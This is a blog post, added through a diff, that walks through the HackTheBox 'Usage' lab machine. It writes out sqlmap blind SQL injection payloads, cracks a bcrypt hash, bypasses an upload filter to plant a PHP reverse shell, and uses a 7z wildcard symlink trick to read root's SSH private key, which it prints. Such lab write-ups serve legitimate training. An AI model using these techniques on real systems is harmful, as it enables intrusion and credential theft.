@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  Usage HTB Walkthrough · Chief Dennis&#39; Blog
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Dennis Drebitca">
+<meta name="description" content="The Usage HTB machine is a madium difficulty level HackTheBox Machine. The main techniques and tools used to crack this machine are:
+- Blind SQL injection with SQLmap- Burpsuite- Hash cracking with JohnTheRipper- 7z Wildcard Spare exploitationReconnaissanceLink to headingWe start a broad Nmap scan by executing the following command:
+sudo nmap -sS -T5 -vvv -p- 10.10.11.18 -Pn -oG nmap_inicial Where the arguments mean:">
+<meta name="keywords" content="blog,developer,personal,cybersecurity,IT,cloud">
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Usage HTB Walkthrough"/>
+<meta name="twitter:description" content="The Usage HTB machine is a madium difficulty level HackTheBox Machine. The main techniques and tools used to crack this machine are:
+- Blind SQL injection with SQLmap- Burpsuite- Hash cracking with JohnTheRipper- 7z Wildcard Spare exploitationReconnaissanceLink to headingWe start a broad Nmap scan by executing the following command:
+sudo nmap -sS -T5 -vvv -p- 10.10.11.18 -Pn -oG nmap_inicial Where the arguments mean:"/>
+
+<meta property="og:title" content="Usage HTB Walkthrough" />
+<meta property="og:description" content="The Usage HTB machine is a madium difficulty level HackTheBox Machine. The main techniques and tools used to crack this machine are:
+- Blind SQL injection with SQLmap- Burpsuite- Hash cracking with JohnTheRipper- 7z Wildcard Spare exploitationReconnaissanceLink to headingWe start a broad Nmap scan by executing the following command:
+sudo nmap -sS -T5 -vvv -p- 10.10.11.18 -Pn -oG nmap_inicial Where the arguments mean:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://chiefdennis.github.io/posts/htb_usage/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-05-29T13:07:16+01:00" />
+<meta property="article:modified_time" content="2024-05-29T13:07:16+01:00" />
+
+
+
+
+
+
+<link rel="canonical" href="https://chiefdennis.github.io/posts/htb_usage/">
+
+
+<link rel="preload" href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.e1bdf152d93b060b06ba5d496486ed9c201a8b95d335e035beb5faebe3b61cad.css" integrity="sha256-4b3xUtk7BgsGul1JZIbtnCAai5XTNeA1vrX66&#43;O2HK0=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+  
+    
+    <link rel="stylesheet" href="/css/custom.min.de332fc1405ae8603f697e77d3ffe869fde950cc77184ea542dc2be374a0b92b.css" integrity="sha256-3jMvwUBa6GA/aX530//oaf3pUMx3GE6lQtwr43SguSs=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      Chief Dennis&#39; Blog
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/about/">About</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/posts/">Catch The Flag</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/projects/">Projects</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/tags/">Tags</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/contact/">Contact me</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://chiefdennis.github.io/posts/htb_usage/">
+              Usage HTB Walkthrough
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime="2024-05-29T13:07:16&#43;01:00">
+                May 29, 2024
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa fa-clock-o" aria-hidden="true"></i>
+              6-minute read
+            </span>
+          </div>
+          <div class="authors">
+  <i class="fa fa-user" aria-hidden="true"></i>
+    <a href="/authors/dennis-drebitca/">Dennis Drebitca</a></div>
+
+          
+          <div class="tags">
+  <i class="fa fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/sql-injection/">SQL Injection</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/sqlmap/">SQLmap</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/burpsuite/">Burpsuite</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/hash-cracking/">Hash Cracking</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/johntheripper/">JohnTheRipper</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/7z-wildcard-spare/">7z Wildcard Spare</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/wfuzz/">wfuzz</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <p><img src="Scr_20.png#centre" alt="image"></p>
+<p>The Usage HTB machine is a madium difficulty level HackTheBox Machine. The main techniques and tools used to crack this machine are:</p>
+<pre><code>- Blind SQL injection with SQLmap
+- Burpsuite
+- Hash cracking with JohnTheRipper
+- 7z Wildcard Spare exploitation
+</code></pre>
+<h2 id="reconnaissance">
+  Reconnaissance
+  <a class="heading-link" href="#reconnaissance">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>We start a broad Nmap scan by executing the following command:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo nmap -sS -T5 -vvv -p- 10.10.11.18 -Pn -oG nmap_inicial
+</span></span></code></pre></div><p>Where the arguments mean:</p>
+<pre><code>-sS: SYN port scan
+-T5: Using timing template 5 of NMAP
+-vvv: Triple verbose so NMAP prints a lot of information
+-p-: All ports are scanned
+-Pn: Skips Host Discovery
+-oG: Grep Format
+</code></pre>
+<p>The scan returns the following information:</p>
+<p><img src="Scr.png" alt="image"></p>
+<p>It looks like ports 20 and 80 are open. Classic open ports for SSH and https. Next, we run a more comprehensive scan on the open ports:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo nmap -sCV -p22,80 10.10.11.221 -oN nmap_exhaustivo -v
+</span></span></code></pre></div><p>Now the arguments used mean:</p>
+<pre><code>-sCV: Launches all scanning scripts to discover services and versions running on these ports
+-oN: Normal output format
+-v: Single verbose
+</code></pre>
+<p>The results for this second scan are the following:</p>
+<p><img src="Scr_1.png" alt="image"></p>
+<p>We now need to add the IP to /etc/hosts for us to follow the redirect to <a href="http://usage.htb/"  class="external-link" target="_blank" rel="noopener">http://usage.htb/</a></p>
+<p>The tool whatweb shows us the following information:</p>
+<p><img src="Scr_2.png" alt="image"></p>
+<p>The server is ubuntu running NGINX, as well as the Laravel web framework.</p>
+<p>The landing page shows a http form, asking to log in, register or admin. The admin page is also a login page.</p>
+<p><img src="Scr_5.png" alt="image"></p>
+<p>The usual SSH and HTTP ports are open. Now lets try to enumerate subdirectories via brute force with WFUZZ</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo wfuzz -c -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc <span class="m">404</span> http://usage.htb/FUZZ 
+</span></span></code></pre></div><p>It looks like there is some kind of WAF that is blocking the fuzzing. We will come back later to fuzzing if there is no low hanging fruit.</p>
+<p>There is a password recovery page, and when a &rsquo; is typed, the server crashes. It looks like something is going on here: SQL injection.</p>
+<p><img src="Scr_3.png" alt="image"></p>
+<p>Lets use SQLmap to exploit the SQL injection. First, we need to use Burp Suite to take a look at the request to know how to proceed.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">forget</span><span class="o">-</span><span class="n">password</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Host</span><span class="p">:</span><span class="w"> </span><span class="k">usage</span><span class="p">.</span><span class="n">htb</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="mi">5</span><span class="p">.</span><span class="mi">0</span><span class="w"> </span><span class="p">(</span><span class="n">X11</span><span class="p">;</span><span class="w"> </span><span class="n">Linux</span><span class="w"> </span><span class="n">x86_64</span><span class="p">;</span><span class="w"> </span><span class="n">rv</span><span class="p">:</span><span class="mi">109</span><span class="p">.</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="n">Gecko</span><span class="o">/</span><span class="mi">20100101</span><span class="w"> </span><span class="n">Firefox</span><span class="o">/</span><span class="mi">115</span><span class="p">.</span><span class="mi">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="p">:</span><span class="w"> </span><span class="nb">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mi">0</span><span class="p">.</span><span class="mi">9</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">avif</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">webp</span><span class="p">,</span><span class="o">*</span><span class="cm">/*;q=0.8
+</span></span></span><span class="line"><span class="cl"><span class="cm">Accept-Language: en-US,en;q=0.5
+</span></span></span><span class="line"><span class="cl"><span class="cm">Accept-Encoding: gzip, deflate, br
+</span></span></span><span class="line"><span class="cl"><span class="cm">Content-Type: application/x-www-form-urlencoded
+</span></span></span><span class="line"><span class="cl"><span class="cm">Content-Length: 58
+</span></span></span><span class="line"><span class="cl"><span class="cm">Origin: http://usage.htb
+</span></span></span><span class="line"><span class="cl"><span class="cm">Connection: close
+</span></span></span><span class="line"><span class="cl"><span class="cm">Referer: http://usage.htb/forget-password
+</span></span></span><span class="line"><span class="cl"><span class="cm">Cookie: XSRF-TOKEN=eyJpdiI6InhycjdFU1pySnhWV25yRSttLzloYXc9PSIsInZhbHVlIjoiSElncjJLVzNVYUYyak1Ta2xublludHcyRU1vNFpXNmNOV3c3U0lxTFB4T3JzVVZuYUZ1ZWNCblRobFhVdG01NjJuV29ZeGduR2Y1S3FkMExqZzNwR1VWamk1ZVBDcmxlM2VyaWFiRHllOXpwMlpKaFIvYnNId0YyOGkrWUM2cVEiLCJtYWMiOiI2MjQxNDAzZGYxYWE4YTViNjc5N2I0MmRkYjdjMWNkZmQ4MWU0ZDQ3ZTNiZjNmM2EyYzdlOGQxYTI5MmMzODZiIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6ImIrelhhN1Z4Y2RFY050SllhUlh4dUE9PSIsInZhbHVlIjoiakZlMTV6Uytpd1NITGNZTDI3bFRyYUlScVBqMndnd1hzdUJVb2hjenk2eDdkaHhhNkR0Vy9QanVEVmU4M3VtVGhaUkNwZy9RbkEzYzk0S2cySzg1SHRRUm1EN3NNdm9YS3lmd3A0MDhrdVhRTzc2RjdVdzJDdGEyODNIUlVaa3QiLCJtYWMiOiIzNWJiYjhhZTZkMjFmNzgxMDI4ZDllOWFjZjVkNjQ4MGJiOWNlOTk2ODhmMmMxY2ZhNjBjMThiMGQ4MDQ3MTRmIiwidGFnIjoiIn0%3D
+</span></span></span><span class="line"><span class="cl"><span class="cm">Upgrade-Insecure-Requests: 1
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">_token=2qPJeYFy7moaJgUQeWWsCgA96zN1P3nUCFlKzT5D&amp;email=test
+</span></span></span></code></pre></div><p>It is a POST request, not a GET request. The parameter we have to exploit is &ldquo;email&rdquo;. Now, we can build the command:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sqlmap -r request.txt -p email --batch --level <span class="m">5</span> --risk <span class="m">3</span> --dbms<span class="o">=</span>mysql --dbs
+</span></span></code></pre></div><p>We specify the request, the parameter to be injected, the type of database used and enumerate the databases, so we can extract them one by one.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/share/sqlmap/output/usage.htb<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ cat log       
+</span></span><span class="line"><span class="cl">sqlmap identified the following injection point<span class="o">(</span>s<span class="o">)</span> with a total of <span class="m">721</span> HTTP<span class="o">(</span>s<span class="o">)</span> requests:
+</span></span><span class="line"><span class="cl">---
+</span></span><span class="line"><span class="cl">Parameter: email <span class="o">(</span>POST<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    Type: boolean-based blind
+</span></span><span class="line"><span class="cl">    Title: AND boolean-based blind - WHERE or HAVING clause <span class="o">(</span>subquery - comment<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    Payload: <span class="nv">_token</span><span class="o">=</span>2qPJeYFy7moaJgUQeWWsCgA96zN1P3nUCFlKzT5D<span class="p">&amp;</span><span class="nv">email</span><span class="o">=</span>test<span class="s1">&#39; AND 5093=(SELECT (CASE WHEN (5093=5093) THEN 5093 ELSE (SELECT 2481 UNION SELECT 1892) END))-- -
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">    Type: time-based blind
+</span></span></span><span class="line"><span class="cl"><span class="s1">    Title: MySQL &gt; 5.0.12 AND time-based blind (heavy query)
+</span></span></span><span class="line"><span class="cl"><span class="s1">    Payload: _token=2qPJeYFy7moaJgUQeWWsCgA96zN1P3nUCFlKzT5D&amp;email=test&#39;</span> AND <span class="nv">6545</span><span class="o">=(</span>SELECT COUNT<span class="o">(</span>*<span class="o">)</span> FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE <span class="m">0</span> XOR 1<span class="o">)</span>-- OjGy
+</span></span><span class="line"><span class="cl">---
+</span></span><span class="line"><span class="cl">web server operating system: Linux Ubuntu
+</span></span><span class="line"><span class="cl">web application technology: Nginx 1.18.0
+</span></span><span class="line"><span class="cl">back-end DBMS: MySQL &gt; 5.0.12
+</span></span><span class="line"><span class="cl">available databases <span class="o">[</span>3<span class="o">]</span>:
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> information_schema
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> performance_schema
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> usage_blog
+</span></span></code></pre></div><p>The most interesting DB is usage_blog, so lets try and extract it using SQLmap and its blind time-based injection.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sqlmap -r request.txt -p email --batch --level <span class="m">5</span> --risk <span class="m">3</span> --dbms<span class="o">=</span>mysql -D usage_blog --dump --threads<span class="o">=</span><span class="m">10</span>
+</span></span></code></pre></div><p>As this is a time-based injection, it is highly advised to use the &ndash;threads argument in order to speed up the process. After a while, the table <em>admin_users</em> is dumped. Here we can see the hash of the admin account:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">id,name,avatar,password,username,createa_at,updated_at,remember_token
+</span></span><span class="line"><span class="cl">1,Administrator,&lt;blank&gt;,<span class="nv">$2</span>y<span class="nv">$10$ohq2kLpBH</span>/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2,admin,&lt;blank&gt;,2023-07-23 06:02:19,kThXIKu7GhLpgwStz7fCFxiC<span class="o">[</span>bAQQ?<span class="se">\x</span>11?PpxwEkzv1Sdzva0qLYaDhllwrsLT
+</span></span></code></pre></div><p>Another set of data is interesting:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">retrieved: <span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;Administrator&#34;</span>,<span class="s2">&#34;password&#34;</span>:<span class="s2">&#34;</span><span class="nv">$2</span><span class="s2">y</span><span class="nv">$10$E9</span><span class="s2">.N1P92fYSjJGQDfBrUaO05EHV4BuiQIAciAMA?!M   mA2%A?H?K&#34;</span>,<span class="s2">&#34;password_confirmation&#34;</span>:<span class="s2">&#34;</span><span class="nv">$2</span><span class="s2">y</span><span class="nv">$10$E9</span><span class="s2">.N1P92fYSjJGQDeBrUaJ))ABA!1a?  ?  )a !!A? ?    i1A?? ??    11!?!?Q?? ?a?  zpIB8ykA2Ya@d1?i????9xUdwBSS02&#34;</span>,<span class="s2">&#34;_method&#34;</span>:<span class="s2">&#34;PUT&#34;</span><span class="o">}</span>
+</span></span></code></pre></div><p>This second hash seems to be corrupted during the dumping of the database. Using JohnTheRipper, we can crack the first hash with the following command:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">john --wordlist<span class="o">=</span>/home/kali/SecLists/Passwords/Leaked-Databases/rockyou.txt <span class="nb">hash</span>
+</span></span></code></pre></div><p>And here is the result and the cracked password:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/maquinas/Usage<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ john --wordlist<span class="o">=</span>/home/kali/SecLists/Passwords/Leaked-Databases/rockyou.txt <span class="nb">hash</span>
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>bcrypt <span class="o">[</span>Blowfish 32/64 X3<span class="o">])</span>
+</span></span><span class="line"><span class="cl">Cost <span class="m">1</span> <span class="o">(</span>iteration count<span class="o">)</span> is <span class="m">1024</span> <span class="k">for</span> all loaded hashes
+</span></span><span class="line"><span class="cl">Will run <span class="m">4</span> OpenMP threads
+</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+</span></span><span class="line"><span class="cl">whatever1        <span class="o">(</span>?<span class="o">)</span>     
+</span></span><span class="line"><span class="cl">1g 0:00:00:09 DONE <span class="o">(</span>2024-05-30 11:20<span class="o">)</span> 0.1096g/s 177.6p/s 177.6c/s 177.6C/s alexis1..serena
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span class="line"><span class="cl">Session completed. 
+</span></span></code></pre></div><p>And now, we can log in to the admin Laravel page:</p>
+<p><img src="Scr_4.png" alt="image"></p>
+<h2 id="initial-access">
+  Initial access
+  <a class="heading-link" href="#initial-access">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Exploring the admin dashboard, we come across a site that allows for a photo upload. It is possible we could upload a php reverse shwll, so lets try it.</p>
+<p><img src="Scr_6.png" alt="image"></p>
+<p>It would be to good to be true: the website does not allow to upload a non-image file. Lets try and trick it.</p>
+<p><img src="Scr_7.png" alt="image"></p>
+<p>Lets try and trick it by modifying the extension.</p>
+<p><img src="Scr_8.png" alt="image"></p>
+<p>It does not execute it. As a last resort, lets open BurpSuite and intercept the upload request.</p>
+<p><img src="Scr_9.png" alt="image"></p>
+<p>Changing the extension on the request worked. We now have a revershe shell on the machine.</p>
+<p><img src="Scr_11.png" alt="image"></p>
+<p>However, i decided to spawn another bash one just in case something goes wrong with the php shell.</p>
+<p><img src="Scr_12.png" alt="image"></p>
+<p>Now as user dash, we can retrieve the user flag.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">dash@usage:~$ cat user.txt
+</span></span><span class="line"><span class="cl">b38b591cfc8e60e5bf8f1bd7ddb9bb13
+</span></span></code></pre></div><p>However, this user can&rsquo;t do anything relevant. Lets see if there are other users that we can gain access to.</p>
+<h2 id="lateral-movement">
+  Lateral movement
+  <a class="heading-link" href="#lateral-movement">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Searching the files, we discover one that contains the a password. It actually is the password for user xander.</p>
+<p><img src="Scr_13.png" alt="image"></p>
+<p>The password is:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">3nc0d3d_pa<span class="nv">$$</span>w0rd
+</span></span></code></pre></div><h2 id="privilege-escalation">
+  Privilege escalation
+  <a class="heading-link" href="#privilege-escalation">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Running linpeas under the user xander, we have some interesting information:</p>
+<p><img src="Scr_14.png" alt="image"></p>
+<p><img src="Scr_15.png" alt="image"></p>
+<p>We can see that user xander can run /usr/bin/usage_management with root privileges. Lets take a look and see what this does:</p>
+<p><img src="Scr_17.png" alt="image"></p>
+<p>It looks like it creates a .zip backup of the &ldquo;project&rdquo;. Lets take a look at the binary and see what does it contain. Since it is a precompiled binary, ad not a script, we would have to use ghydra to decompile it. First, lets see if the strings present in the binary are useful:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">strings /usr/bin/usage_management
+</span></span></code></pre></div><p><img src="Scr_16.png" alt="image"></p>
+<p>There is a interesting string:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
+</span></span></code></pre></div><p>This command is susceptible to a trick called &ldquo;wildcard spare&rdquo;. The command invokes 7z with a wildcard, &ldquo;*&rdquo; , and we can exploit it using <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks"  class="external-link" target="_blank" rel="noopener">this guide on HachTricks</a>.</p>
+<p>Citing directly from HackTricks: &ldquo;In 7z even using &ndash; before * (note that &ndash; means that the following input cannot treated as parameters, so just file paths in this case) you can cause an arbitrary error to read a file&rdquo;</p>
+<p>In my case, I want to read the SSH private key of root. Following the HackTricks steps:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">cd</span> /var/www/html
+</span></span><span class="line"><span class="cl">touch @id_rsa
+</span></span><span class="line"><span class="cl">ln -s /root/.ssh/id_rsa id_rsa
+</span></span><span class="line"><span class="cl">sudo /usr/bin/usage_management
+</span></span></code></pre></div><p><img src="Scr_18.png" alt="image"></p>
+<p>We get the private key. Now we can use it to log in as root and get the root flag:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;-----BEGIN OPENSSH PRIVATE KEY-----                                                  
+</span></span></span><span class="line"><span class="cl"><span class="s1">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+</span></span></span><span class="line"><span class="cl"><span class="s1">QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
+</span></span></span><span class="line"><span class="cl"><span class="s1">QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
+</span></span></span><span class="line"><span class="cl"><span class="s1">AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
+</span></span></span><span class="line"><span class="cl"><span class="s1">H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
+</span></span></span><span class="line"><span class="cl"><span class="s1">-----END OPENSSH PRIVATE KEY-----&#39;</span> &gt; id_rsa
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">chmod <span class="m">600</span> id_rsa
+</span></span><span class="line"><span class="cl">ssh -i id_rsa root@usage.htb
+</span></span></code></pre></div><p><img src="Scr_19.png" alt="image"></p>
+<p>And rooted!</p>
+<h2 id="conclusion">
+  Conclusion
+  <a class="heading-link" href="#conclusion">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Hacking through the Usage HTB machine provides valuable insights into penetration testing techniques, including enumeration, vulnerability exploitation, and privilege escalation. By understanding these steps, aspiring ethical hackers like me can enhance their skills and contribute positively to the cybersecurity landscape.</p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2023 -
+    
+    2024
+     Dennis Drebitca 
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
